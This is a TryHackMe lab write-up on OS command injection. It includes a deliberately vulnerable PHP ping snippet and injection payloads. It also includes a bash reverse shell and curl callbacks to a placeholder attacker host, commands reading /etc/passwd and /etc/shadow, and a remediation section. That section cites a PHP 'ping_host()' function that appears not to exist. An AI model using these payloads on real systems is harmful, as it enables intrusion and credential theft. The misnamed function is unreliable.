# TryHackMe — Command Injection

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-OS%20Command%20Injection-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Room | Command Injection |
| URL | tryhackme.com/room/oscommandinjection |
| Path | Jr Penetration Tester → Web Application Vulnerabilities |
| Tasks | Task 1 — Task 6 (all, 100%) |

---

## Tasks Completed

| Task | Topic |
|------|-------|
| Task 1 | Introduction |
| Task 2 | Discovering Command Injection |
| Task 3 | Exploiting Command Injection |
| Task 4 | Practical |
| Task 5 | Remediation |
| Task 6 | Conclusion |

---

## What is Command Injection?

Command injection occurs when user-supplied input is passed directly to a system shell command without sanitisation — allowing the attacker to append or replace the intended command with their own.

**Severity:** Critical — successful exploitation gives direct OS-level code execution on the server, not just application-level access.

---

## Task 2 — Discovering Command Injection

### Where to look

Any feature that interacts with the OS on the backend:
- File operations (upload, convert, resize, compress)
- Network tools (ping, traceroute, DNS lookup)
- Report generation
- System status checks

### Vulnerable code example

```php
// Vulnerable PHP — passes user input directly to shell
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

Normal use: `?ip=8.8.8.8` → runs `ping -c 4 8.8.8.8`

Attack: `?ip=8.8.8.8; whoami` → runs `ping -c 4 8.8.8.8; whoami`

---

## Task 3 — Exploiting Command Injection

### Command separators — chaining commands

```bash
;          # Run second command regardless of first
&&         # Run second command only if first succeeds
||         # Run second command only if first fails
|          # Pipe — pass output of first to second
`command`  # Backtick — command substitution (Linux)
$(command) # Dollar syntax — command substitution
```

### Basic detection payloads

```bash
# Append a command after the intended input
8.8.8.8; whoami
8.8.8.8 && whoami
8.8.8.8 | whoami

# Time-based blind detection (if no output visible)
8.8.8.8; sleep 5
8.8.8.8 && ping -c 5 127.0.0.1
```

### Common commands to run once injection is confirmed

```bash
# Identity and privilege
whoami
id

# System information
uname -a
cat /etc/os-release
hostname

# Network information
ifconfig
ip a
cat /etc/hosts

# Interesting files
cat /etc/passwd
ls /home
ls /var/www/html

# Try to read sensitive files
cat /etc/shadow
find / -name "*.conf" 2>/dev/null
```

### Blind Command Injection

When the application doesn't return command output directly:

**Out-of-band detection — force the server to call back:**
```bash
# DNS callback — server makes DNS lookup to attacker-controlled domain
8.8.8.8; nslookup ATTACKER.burpcollaborator.net

# HTTP callback — server fetches a URL from attacker server
8.8.8.8; curl http://ATTACKER_IP:8080/proof

# Set up listener to catch the callback
nc -lvnp 8080
python3 -m http.server 8080
```

**Time-based detection:**
```bash
# If response takes 5 seconds longer — injection confirmed
8.8.8.8; sleep 5
```

### Reverse Shell from Command Injection

Once injection is confirmed:

```bash
# Bash reverse shell
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# On attacker machine — catch the shell
nc -lvnp 4444
```

---

## Task 4 — Practical

Applied command injection against a live vulnerable target:

```
Target feature: IP address ping tool
Vulnerable parameter: ip=

Step 1: Confirmed injection with time delay
  → ip=127.0.0.1; sleep 5  → page took 5 seconds longer to respond

Step 2: Confirmed output visible
  → ip=127.0.0.1; whoami  → response showed "www-data"

Step 3: Enumerated the system
  → ip=127.0.0.1; cat /etc/passwd  → full user list
  → ip=127.0.0.1; ls /home         → found user directories

Step 4: Read the flag
  → ip=127.0.0.1; cat /home/user/flag.txt
```

---

## Task 5 — Remediation

| Fix | Implementation |
|-----|---------------|
| **Never pass user input to shell functions** | Use language-native libraries instead (PHP: `ping_host()` not `system("ping $host")`) |
| **Input validation** | Whitelist — only allow IP address format `^[0-9.]+$`, reject everything else |
| **Parameterised shell calls** | Use `escapeshellarg()` / `escapeshellcmd()` in PHP |
| **Least privilege** | Web server process runs as low-privilege user — limits damage from successful injection |
| **WAF** | Detect and block common separator characters in input |

---

## Key Takeaways

- **Command injection is the most impactful web vulnerability** — it gives a shell on the OS, not just application access
- **Time-based blind injection is the detection method when no output is visible** — a 5-second delay after `; sleep 5` confirms execution
- **Out-of-band callbacks remove the need for visible output** — DNS/HTTP callbacks to infrastructure you control confirm injection silently
- **The ; separator works in most cases** — try `&&`, `||`, and `|` if `;` is filtered
- **Never call shell commands with user input** — this vulnerability is entirely preventable by using language-native functions instead of spawning a shell

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
